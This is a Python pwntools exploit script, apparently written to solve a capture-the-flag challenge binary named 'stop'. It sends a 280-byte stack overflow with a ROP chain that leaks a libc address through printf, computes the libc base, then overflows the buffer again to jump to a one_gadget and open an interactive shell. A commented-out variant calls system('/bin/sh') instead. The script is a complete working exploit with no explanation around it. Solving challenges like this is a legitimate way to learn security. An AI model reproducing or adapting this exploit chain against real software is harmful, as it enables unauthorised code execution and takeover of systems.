from pwn import *


e = ELF("./stop")
#libc = ELF("./libc.so.6")

p = process("./stop")

#context.log_level="debug"
#gdb.attach(p, """break * main+405""")


p.recvuntil("? ")
p.sendline("a")


main = 0x40073c
answers = 0x602060

ret = 0x40056e
pop_rdi = 0x400953

print("answers", hex(answers))
print("leaking from", hex(e.sym["__libc_start_main"]))

#exploit = "Country Capitals\x00"

#exploit += "A"*257 + p64((answers-e.sym["__libc_start_main"])/5)


exploit = "B"*280

exploit += p64(ret)

exploit += p64(pop_rdi)

exploit += p64(e.sym["__libc_start_main"])


exploit += p64(e.plt["printf"])

exploit += p64(ret)
exploit += p64(main)

p.recvuntil("? ")

p.sendline(exploit)

p.recvline()
p.recvline()

dat = p.recv()

print("dat", dat)

base = u64(dat[:6].ljust(8, "\x00")) - 0x21ab0

print("libc address", hex(base))


og = 0x4f2c5

p.sendline("a")


exploit = "A"*280

exploit += p64(ret)*2

exploit += p64(base+og)

"""
exploit += p64(pop_rdi)


exploit += p64(next(libc.search("/bin/sh")))


exploit += p64(libc.sym["system"])

print("binsh", hex(next(libc.search("/bin/sh"))))
print("system", hex(libc.sym["system"]))
"""

p.recvuntil("? ")
p.sendline(exploit)

p.interactive()
